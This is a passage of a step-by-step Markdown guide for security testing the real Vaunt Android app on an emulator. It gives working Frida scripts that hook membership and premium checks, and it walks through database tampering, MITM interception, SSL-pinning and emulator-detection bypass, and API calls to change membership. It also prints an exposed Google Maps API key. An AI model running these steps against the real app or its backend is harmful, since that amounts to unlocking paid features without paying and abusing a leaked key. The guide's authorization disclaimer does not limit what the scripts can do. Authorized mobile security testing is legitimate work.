        var CatalystInstanceImpl = Java.use('com.facebook.react.bridge.CatalystInstanceImpl');

        CatalystInstanceImpl.callFunction.implementation = function(moduleName, methodName, arguments) {
            console.log("[JS Bridge] Call: " + moduleName + "." + methodName);
            console.log("[JS Bridge] Arguments: " + arguments);

            // Intercept membership check calls
            if (methodName.toLowerCase().indexOf('membership') >= 0 ||
                methodName.toLowerCase().indexOf('premium') >= 0 ||
                methodName.toLowerCase().indexOf('subscription') >= 0) {
                console.log("[!] MEMBERSHIP CHECK DETECTED!");
                console.log("[!] Module: " + moduleName);
                console.log("[!] Method: " + methodName);
            }

            var result = this.callFunction(moduleName, methodName, arguments);
            return result;
        };

        console.log("[+] Hooks installed!");

    } catch(err) {
        console.log("[-] Error: " + err);
    }
});
```

**Run:**
```batch
frida -U -l C:\VauntTesting\frida_bypass_premium.js com.volato.vaunt
```

---

### STEP 5: Spawn App with Frida (Fresh Start)

**Kill the app:**
```batch
adb shell am force-stop com.volato.vaunt
```

**Spawn with Frida:**
```batch
frida -U -f com.volato.vaunt -l C:\VauntTesting\frida_asyncstorage.js --no-pause
```

This starts the app with Frida attached from the beginning.

---

### STEP 6: Intercept and Modify Method Returns

**Create advanced bypass script:**
```batch
notepad C:\VauntTesting\frida_force_premium.js
```

**Add:**
```javascript
console.log("[*] Forcing Premium Status...");

// Wait for Java runtime
Java.perform(function() {
    console.log("[*] Enumerating classes...");

    // This function will search for membership-related classes
    Java.enumerateLoadedClasses({
        onMatch: function(className) {
            // Look for classes that might contain membership logic
            if (className.toLowerCase().indexOf('membership') >= 0 ||
                className.toLowerCase().indexOf('subscription') >= 0 ||
                className.toLowerCase().indexOf('premium') >= 0) {
                console.log("[+] Found interesting class: " + className);

                try {
                    var targetClass = Java.use(className);
                    console.log("[+] Successfully loaded: " + className);

                    // Try to enumerate methods
                    var methods = targetClass.class.getDeclaredMethods();
                    methods.forEach(function(method) {
                        console.log("    Method: " + method.getName());
                    });
                } catch(err) {
                    // Class might not be hookable
                }
            }
        },
        onComplete: function() {
            console.log("[*] Class enumeration complete");
        }
    });
});
```

**Run:**
```batch
frida -U -f com.volato.vaunt -l C:\VauntTesting\frida_force_premium.js --no-pause
```

**Analyze output to find membership-related classes and methods**

---

### STEP 7: Document Frida Results

```batch
notepad C:\VauntTesting\Test4_Results.txt
```

```
TEST 4: Runtime Instrumentation with Frida
Date: [Today's Date]
Tester: [Your Name]

FRIDA SETUP:
Frida Server Version: [Version]
Installation: SUCCESS / FAILED
Process Attachment: SUCCESS / FAILED

ASYNCSTORAGE MONITORING:
Keys Observed: [List]
Sensitive Data Logged: YES / NO
Membership Data Found: YES / NO

CLASSES DISCOVERED:
[List all membership-related classes found]

METHODS DISCOVERED:
[List all membership-related methods found]

BYPASS ATTEMPTS:
Method Hooking: SUCCESS / PARTIAL / FAILED
Return Value Modification: SUCCESS / FAILED
Premium Access Granted: YES / NO

SEVERITY: CRITICAL
CWE: CWE-353 (Missing Support for Integrity Check)

NOTES:
[Additional observations about app's runtime behavior]
```

---

### TEST 4 CHECKLIST

- [ ] Python and Frida tools installed
- [ ] Downloaded correct frida-server for x86/x86_64
- [ ] Pushed frida-server to emulator
- [ ] Started frida-server with root privileges
- [ ] Verified frida-ps shows emulator processes
- [ ] Created AsyncStorage monitoring script
- [ ] Ran Frida with AsyncStorage script
- [ ] Observed storage operations in real-time
- [ ] Created class enumeration script
- [ ] Identified membership-related classes
- [ ] Identified membership-related methods
- [ ] Attempted method hooking
- [ ] Attempted return value modification
- [ ] Tested if premium bypass works
- [ ] Documented all findings

---

## TEST 5: Static Analysis of JavaScript Bundle

**Objective:** Extract secrets and logic from the app's JavaScript code.

**Difficulty:** ⭐⭐ (Moderate)

---

### STEP 1: Extract the JavaScript Bundle

**Pull the bundle from emulator:**
```batch
adb pull /data/app/com.volato.vaunt-*/base.apk C:\VauntTesting\base.apk
```

Or use the already extracted bundle from APK:
```
C:\Users\YourUsername\...\extracted_apk\assets\index.android.bundle
```

Or from the workspace:
```
\\wsl$\Ubuntu\home\runner\workspace\uploads\extracted_main_apk\assets\index.android.bundle
```

**Copy to your testing folder:**
```batch
copy "\\wsl$\Ubuntu\home\runner\workspace\uploads\extracted_main_apk\assets\index.android.bundle" C:\VauntTesting\
```

---

### STEP 2: Analyze Bundle Size and Format

**Check file size:**
```batch
dir C:\VauntTesting\index.android.bundle
```

Should show approximately 6.4 MB

**Try to view the file:**
```batch
type C:\VauntTesting\index.android.bundle | more
```

The file is likely minified/obfuscated JavaScript.

---

### STEP 3: Search for Sensitive Strings

**Open Command Prompt in testing folder:**
```batch
cd C:\VauntTesting
```

**Search for API keys:**
```batch
findstr /i "api.key apiKey API_KEY secret Secret SECRET password Password PASSWORD" index.android.bundle > api_keys.txt
```

**Search for membership strings:**
```batch
findstr /i "cabin_plus cabin+ membership premium subscription priorityPass" index.android.bundle > membership_strings.txt
```

**Search for API endpoints:**
```batch
findstr /i "https://api https:// /v1/ endpoint" index.android.bundle > api_endpoints.txt
```

**Search for AsyncStorage usage:**
```batch
findstr /i "AsyncStorage setItem getItem" index.android.bundle > asyncstorage_usage.txt
```

**Search for validation functions:**
```batch
findstr /i "isPremium checkMembership validateSubscription isActive" index.android.bundle > validation_functions.txt
```

---

### STEP 4: Use PowerShell for Better Searching

**Open PowerShell:**
```powershell
cd C:\VauntTesting
```

**Search with regex:**
```powershell
# Find API URLs
Select-String -Path .\index.android.bundle -Pattern "https?://[a-zA-Z0-9.-]+\.[a-z]{2,}/[a-zA-Z0-9/_-]+" -AllMatches |
  ForEach-Object { $_.Matches.Value } |
  Sort-Object -Unique > urls.txt
```

**Find JWT tokens (if any hardcoded):**
```powershell
Select-String -Path .\index.android.bundle -Pattern "eyJ[A-Za-z0-9-_=]+\.[A-Za-z0-9-_=]+\.?[A-Za-z0-9-_.+/=]*" -AllMatches |
  ForEach-Object { $_.Matches.Value } > potential_tokens.txt
```

**Find email addresses:**
```powershell
Select-String -Path .\index.android.bundle -Pattern "[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}" -AllMatches |
  ForEach-Object { $_.Matches.Value } |
  Sort-Object -Unique > emails.txt
```

---

### STEP 5: Extract Readable Strings

**Use strings utility (if available):**

Download strings.exe from Sysinternals:
- https://docs.microsoft.com/en-us/sysinternals/downloads/strings

```batch
strings C:\VauntTesting\index.android.bundle > strings_output.txt
```

**Or use PowerShell:**
```powershell
Get-Content -Path .\index.android.bundle -Encoding Byte -ReadCount 1 |
  Where-Object { $_ -ge 32 -and $_ -le 126 } |
  ForEach-Object { [char]$_ } |
  Out-File strings.txt
```

---

### STEP 6: Beautify JavaScript (Attempt)

**Install JavaScript Beautifier:**

If you have Node.js:
```batch
npm install -g js-beautify
```

**Try to beautify:**
```batch
js-beautify index.android.bundle > bundle_readable.js
```

**Warning:** This may take time and the file will be LARGE!

**Alternative: Use VS Code:**
- Open VS Code
- File → Open File → Select `index.android.bundle`
- Right-click → Format Document
- Or use extension: "Beautify"

---

### STEP 7: Search Beautified Code

If you successfully beautified the code:

**Search in VS Code:**
- Press `Ctrl + F`
- Search for:
  - `membershipLevel`
  - `cabin_plus`
  - `isPremium`
  - `checkSubscription`
  - `AsyncStorage`
  - `api.vaunt.com`

**Look for validation logic:**
```javascript
// Example of what you might find:
function isPremiumUser(user) {
    return user.membershipLevel === 'cabin_plus' && user.subscriptionStatus === 'active';
}
```

**This reveals client-side validation!**

---

### STEP 8: Analyze AndroidManifest.xml

**Extract manifest:**
```batch
copy "\\wsl$\Ubuntu\home\runner\workspace\uploads\decompiled_analysis\decompiled_vaunt\AndroidManifest.xml" C:\VauntTesting\
```

**Open in browser or text editor:**
```batch
notepad C:\VauntTesting\AndroidManifest.xml
```

Or use VS Code for better formatting.

**Look for:**

1. **API Keys:**
   ```xml
   <meta-data android:name="com.google.android.geo.API_KEY"
              android:value="AIzaSyCDM5k8fjgrQER4OaAzmaXUflX6TL-WVQw"/>
   ```
   ✅ **Found:** Google Maps API key exposed!

2. **Permissions:**
   - `ACCESS_FINE_LOCATION`
   - `INTERNET`
   - `READ_EXTERNAL_STORAGE`
   - `WRITE_EXTERNAL_STORAGE`

3. **Firebase configuration**
4. **Deep link handlers**
5. **Exported activities** (security risk)

---

### STEP 9: Create Comprehensive Report

```batch
notepad C:\VauntTesting\Test5_Static_Analysis_Report.txt
```

```
TEST 5: Static Analysis Report
Date: [Today's Date]
Tester: [Your Name]

=== JAVASCRIPT BUNDLE ANALYSIS ===

Bundle Size: 6.4 MB
Obfuscation Level: [None / Light / Heavy]
Beautification: [Successful / Partial / Failed]

HARDCODED SECRETS FOUND:
1. Google Maps API Key: AIzaSyCDM5k8fjgrQER4OaAzmaXUflX6TL-WVQw
   Location: AndroidManifest.xml line 79
   Severity: MEDIUM
   Risk: API key quota abuse

2. [List any other secrets found]

API ENDPOINTS DISCOVERED:
[Paste unique URLs from urls.txt]

MEMBERSHIP VALIDATION LOGIC:
[Describe any client-side validation found]
Example: Function isPremiumUser() checks membershipLevel locally

ASYNCSTORAGE USAGE:
Keys used for storage:
- @UserData
- @MembershipInfo
- @AuthToken
- [List others]

EXPOSED BUSINESS LOGIC:
1. Membership tiers: core, cabin_plus
2. Subscription validation occurs client-side
3. Priority pass counting done locally
4. [Other findings]

FIREBASE CONFIGURATION:
Project ID: [If found]
API Key: [If found]
Database URL: [If found]

PERMISSIONS ANALYSIS:
Dangerous permissions requested:
- ACCESS_FINE_LOCATION - Justified for flight bookings
- READ_EXTERNAL_STORAGE - Potential privacy risk
- [Others]

DEEP LINK HANDLERS:
- vaunt://
- com.volato.vaunt://
- exp+vaunt://
Potential for deep link hijacking: [YES/NO]

=== CRITICAL FINDINGS ===

1. NO CODE OBFUSCATION
   - JavaScript bundle is readable
   - Business logic fully exposed
   - Validation logic reverse-engineerable
   - Severity: HIGH
   - CWE: CWE-540

2. CLIENT-SIDE VALIDATION
   - Membership checks in JavaScript
   - Subscription validation in client
   - No server-side verification observed
   - Severity: CRITICAL
   - CWE: CWE-602

3. EXPOSED API CREDENTIALS
   - Google Maps API key in manifest
   - Firebase config potentially exposed
   - Severity: MEDIUM
   - CWE: CWE-798

=== RECOMMENDATIONS ===

1. IMMEDIATE:
   - Rotate all exposed API keys
   - Implement server-side validation
   - Add code obfuscation

2. SHORT TERM:
   - Enable Hermes bytecode
   - Implement ProGuard for native code
   - Move sensitive logic to backend

3. LONG TERM:
   - Implement certificate pinning
   - Add runtime integrity checks
   - Regular security audits

=== EVIDENCE FILES ===

- api_keys.txt - Extracted API keys
- membership_strings.txt - Membership-related strings
- api_endpoints.txt - API endpoints list
- urls.txt - All URLs found
- strings.txt - Readable strings from bundle
- bundle_readable.js - Beautified JavaScript (if successful)
```

---

### TEST 5 CHECKLIST

- [ ] Extracted JavaScript bundle from APK
- [ ] Checked bundle size (6.4 MB confirmed)
- [ ] Searched for API keys
- [ ] Searched for membership-related strings
- [ ] Extracted API endpoints list
- [ ] Searched for AsyncStorage usage
- [ ] Searched for validation functions
- [ ] Used PowerShell for regex searches
- [ ] Extracted all URLs
- [ ] Extracted readable strings
- [ ] Attempted beautification of JavaScript
- [ ] Searched beautified code for logic flaws
- [ ] Analyzed AndroidManifest.xml
- [ ] Documented all exposed API keys
- [ ] Documented permissions
- [ ] Documented deep link handlers
- [ ] Created comprehensive static analysis report
- [ ] Saved all evidence files

---

## Troubleshooting Common Issues

### Issue 1: ADB Not Connecting to MSI App Player

**Symptoms:**
- `adb devices` shows no devices
- "device not found" errors

**Solutions:**

1. **Find MSI App Player's ADB port:**
   ```batch
   netstat -ano | findstr "5555"
   netstat -ano | findstr "21503"
   ```

2. **Try different ports:**
   ```batch
   adb connect 127.0.0.1:5555
   adb connect 127.0.0.1:5556
   adb connect 127.0.0.1:21503
   adb connect 127.0.0.1:21513
   ```

3. **Restart ADB server:**
   ```batch
   adb kill-server
   adb start-server
   adb devices
   ```

4. **Check MSI App Player settings:**
   - Enable "ADB debugging" in emulator settings
   - Enable "USB debugging" in Android settings

5. **Use MSI App Player's built-in ADB:**
   - MSI App Player usually has its own ADB
   - Look in: `C:\Program Files\MSI\MSI App Player\`
   - Use that ADB instead

---

### Issue 2: No Root Access

**Symptoms:**
- `su` command not found
- Permission denied errors

**Solutions:**

1. **Enable root in MSI App Player:**
   - Close MSI App Player
   - Open MSI App Player settings BEFORE starting
   - Look for "Root" option
   - Enable it
   - Start emulator

2. **Install SuperSU or Magisk:**
   - Download SuperSU APK
   - `adb install SuperSU.apk`
   - Open SuperSU app
   - Follow setup wizard

3. **Use different emulator:**
   - NoxPlayer (has root by default)
   - LDPlayer (has root option)
   - MEmu (has root option)

---

### Issue 3: Burp Suite Not Intercepting Traffic

**Symptoms:**
- No traffic appearing in HTTP history
- App shows "No internet connection"
- Certificate errors

**Solutions:**

1. **Check Windows Firewall:**
   ```batch
   netsh advfirewall firewall add rule name="Burp Proxy" dir=in action=allow protocol=TCP localport=8080
   ```

2. **Verify proxy settings:**
   ```batch
   adb shell settings get global http_proxy
   ```

   Should show your IP:8080

3. **Test proxy manually:**
   - Open Chrome in emulator
   - Visit: http://burpsuite
   - If this doesn't load, proxy isn't working

4. **Reinstall certificate:**
   - Delete old Burp certificate
   - Export new one from Burp
   - Convert DER to PEM if needed:
     ```batch
     openssl x509 -inform DER -in burp-cert.cer -out burp-cert.pem
     ```
   - Install PEM version

5. **Disable SSL Pinning (Advanced):**
   - Use Frida with SSL unpinning script
   - Or patch the APK to disable pinning

---

### Issue 4: Frida Not Working

**Symptoms:**
- `frida-ps` shows no processes
- "Failed to spawn" errors
- Connection timeouts

**Solutions:**

1. **Check frida-server is running:**
   ```batch
   adb shell ps | findstr frida
   ```

2. **Restart frida-server:**
   ```batch
   adb shell
   su
   killall frida-server
   /data/local/tmp/frida-server &
   exit
   exit
   ```

3. **Check architecture match:**
   - Emulator is usually x86 or x86_64
   - Make sure you downloaded x86 frida-server, not ARM

4. **Check Frida versions match:**
   ```batch
   frida --version
   adb shell /data/local/tmp/frida-server --version
   ```

   If they don't match, download matching versions

5. **Use different port:**
   ```batch
   # Start frida-server on specific port
   adb shell "/data/local/tmp/frida-server -l 0.0.0.0:27042 &"

   # Connect frida-ps to that port
   frida-ps -H 127.0.0.1:27042
   ```

---

### Issue 5: Cannot Modify Database Files

**Symptoms:**
- Permission denied when pushing
- Database locked errors
- Changes don't persist

**Solutions:**

1. **Stop the app first:**
   ```batch
   adb shell am force-stop com.volato.vaunt
   ```

2. **Fix permissions after push:**
   ```batch
   adb shell
   su
   chmod 660 /data/data/com.volato.vaunt/databases/*
   chown u0_a[XXX]:u0_a[XXX] /data/data/com.volato.vaunt/databases/*
   exit
   exit
   ```

3. **Clear app data:**
   ```batch
   adb shell pm clear com.volato.vaunt
   ```

4. **Modify database while app is running (Advanced):**
   - Use Frida to hook SQLite operations
   - Modify data in memory instead of on disk

---

### Issue 6: App Detects Emulator

**Symptoms:**
- App won't run on emulator
- "This app cannot run on emulators" message
- App crashes immediately

**Solutions:**

1. **Hide emulator signatures:**
   - Use Magisk Hide (requires Magisk)
   - Edit build.prop to look like real device:
     ```batch
     adb shell
     su
     mount -o rw,remount /system
     vi /system/build.prop
     # Change ro.product.model to real device
     # Change ro.build.fingerprint to real device
     ```

2. **Use physical device instead**

3. **Patch the APK:**
   - Decompile APK
   - Remove emulator detection code
   - Recompile and sign

---

## Quick Reference Commands

### Essential ADB Commands

```batch
# Connect to emulator
adb connect 127.0.0.1:5555

# List devices
adb devices

# Install APK
adb install app.apk

# Uninstall app
adb uninstall com.volato.vaunt

# Clear app data
adb shell pm clear com.volato.vaunt

# Force stop app
adb shell am force-stop com.volato.vaunt

# Launch app
adb shell monkey -p com.volato.vaunt -c android.intent.category.LAUNCHER 1

# Pull file from device
adb pull /data/data/com.volato.vaunt/databases/ C:\VauntTesting\

# Push file to device
adb push C:\file.txt /sdcard/

# Shell access
adb shell

# Root shell
adb shell
su

# View logs
adb logcat | findstr vaunt

# List installed packages
adb shell pm list packages | findstr vaunt

# Get app info
adb shell dumpsys package com.volato.vaunt

# Set proxy
adb shell settings put global http_proxy 192.168.1.100:8080

# Clear proxy
adb shell settings put global http_proxy :0

# Screenshot
adb shell screencap /sdcard/screen.png
adb pull /sdcard/screen.png

# Screen record
adb shell screenrecord /sdcard/demo.mp4
# Ctrl+C to stop after a few seconds
adb pull /sdcard/demo.mp4
```

### Essential Frida Commands

```batch
# List processes
frida-ps -U

# Attach to process
frida -U com.volato.vaunt

# Run script
frida -U -l script.js com.volato.vaunt

# Spawn app with script
frida -U -f com.volato.vaunt -l script.js --no-pause

# Interactive REPL
frida -U com.volato.vaunt

# Kill all frida processes
taskkill /F /IM frida.exe
```

### Essential Burp Suite Setup

```batch
# Export certificate (in Burp)
Proxy → Options → Import/export CA cert → Export → DER

# Install certificate on emulator
adb push burp-cert.cer /sdcard/Download/
# Then: Settings → Security → Install from SD card

# Add Windows Firewall rule
netsh advfirewall firewall add rule name="Burp Proxy" dir=in action=allow protocol=TCP localport=8080

# Check firewall rules
netsh advfirewall firewall show rule name="Burp Proxy"
```

### Essential curl Commands

```batch
# GET request
curl -X GET "https://api.vaunt.com/v1/user/profile" ^
  -H "Authorization: Bearer TOKEN"

# POST request
curl -X POST "https://api.vaunt.com/v1/endpoint" ^
  -H "Authorization: Bearer TOKEN" ^
  -H "Content-Type: application/json" ^
  -d "{\"key\":\"value\"}"

# Save response
curl -X GET "https://api.vaunt.com/v1/endpoint" ^
  -H "Authorization: Bearer TOKEN" ^
  > response.json

# Follow redirects
curl -L "https://api.vaunt.com/v1/endpoint"

# Show headers
curl -i "https://api.vaunt.com/v1/endpoint"

# Verbose output
curl -v "https://api.vaunt.com/v1/endpoint"
```

---

## Testing Workflow Summary

**Complete Testing Workflow (All Tests):**

```batch
# 1. Setup
adb connect 127.0.0.1:5555
adb devices
adb install Vaunt.apk

# 2. Test 1: AsyncStorage
adb pull /data/data/com.volato.vaunt/databases/ C:\VauntTesting\
# Modify with DB Browser
adb push C:\VauntTesting\RKStorage /data/data/com.volato.vaunt/databases/
adb shell am force-stop com.volato.vaunt
# Restart and verify

# 3. Test 2: MITM
# Configure Burp proxy in emulator
adb shell settings put global http_proxy 192.168.1.100:8080
# Use app and intercept traffic in Burp
# Modify responses

# 4. Test 3: API Testing
# Extract token from Test 2
set TOKEN=your_token
curl -X GET "https://api.vaunt.com/v1/user/profile" ^
  -H "Authorization: Bearer %TOKEN%"
# Try to modify membership via API

# 5. Test 4: Frida
adb shell "/data/local/tmp/frida-server &"
frida -U -l asyncstorage_hook.js com.volato.vaunt
# Observe runtime behavior

# 6. Test 5: Static Analysis
# Analyze bundle with findstr/grep
findstr /i "cabin_plus membership premium" index.android.bundle
# Analyze AndroidManifest.xml
```

---

## Final Testing Checklist

### Pre-Testing Setup
- [ ] MSI App Player installed and running
- [ ] ADB installed and in PATH
- [ ] Connected to MSI App Player via ADB
- [ ] Root access confirmed (su works)
- [ ] Vaunt APK extracted from XAPK
- [ ] Vaunt app installed on emulator
- [ ] Test account created
- [ ] Testing folder created at C:\VauntTesting
- [ ] Burp Suite installed (for MITM tests)
- [ ] DB Browser for SQLite installed
- [ ] Frida installed (optional)

### Test Execution
- [ ] TEST 1: AsyncStorage manipulation completed
- [ ] TEST 2: MITM attack completed
- [ ] TEST 3: API testing completed
- [ ] TEST 4: Frida hooking completed (optional)
- [ ] TEST 5: Static analysis completed

### Documentation
- [ ] Screenshots taken for each successful exploit
- [ ] Test results documented
- [ ] API endpoints list created
- [ ] Sensitive data inventory created
- [ ] Final report compiled

### Evidence Collection
- [ ] Modified database files saved
- [ ] Burp Suite project saved
- [ ] Frida scripts saved
- [ ] curl command outputs saved
- [ ] Static analysis findings saved
- [ ] All screenshots organized

---

## Important Legal Reminder

⚠️ **CRITICAL WARNING** ⚠️

This testing guide is for **AUTHORIZED SECURITY TESTING ONLY**.

**DO NOT:**
- Test on production systems without written authorization
- Use real user accounts
- Complete actual financial transactions
- Share vulnerabilities publicly before responsible disclosure
- Use exploits for personal gain
- Interfere with legitimate users

**YOU MUST HAVE:**
- Written authorization from Vaunt or the app owner
- A controlled test environment
- Test accounts only
- Legal permission to perform security testing

**VIOLATIONS MAY RESULT IN:**
- Criminal prosecution under CFAA (Computer Fraud and Abuse Act)
- Civil lawsuits
- Violation of DMCA (Digital Millennium Copyright Act)
- Terms of Service violations

**RESPONSIBLE DISCLOSURE:**
- Report findings to Vaunt security team
- Allow 90 days for fixes before public disclosure
- Do not exploit vulnerabilities on production systems

---

## Support and Resources

**Documentation:**
- Main Testing Guide: `/home/runner/workspace/TESTING_GUIDE_AND_NOTES.md`
- Security Analysis: `/home/runner/workspace/SECURITY_ANALYSIS_REPORT.md`
- This Guide: `/home/runner/workspace/MSI_APP_PLAYER_TESTING_GUIDE.md`

**Tools:**
- ADB: https://developer.android.com/studio/releases/platform-tools
- Burp Suite: https://portswigger.net/burp/communitydownload
- Frida: https://frida.re/
- DB Browser for SQLite: https://sqlitebrowser.org/

**Learning Resources:**
- OWASP Mobile Security Testing Guide: https://mobile-security.gitbook.io/
- Android Security: https://source.android.com/security
- React Native Security: https://reactnative.dev/docs/security

---

**Document Version:** 1.0
**Platform:** MSI App Player on Windows
**Status:** Ready for Testing
**Last Updated:** November 3, 2025

**Good luck with your testing!** 🔒🔍
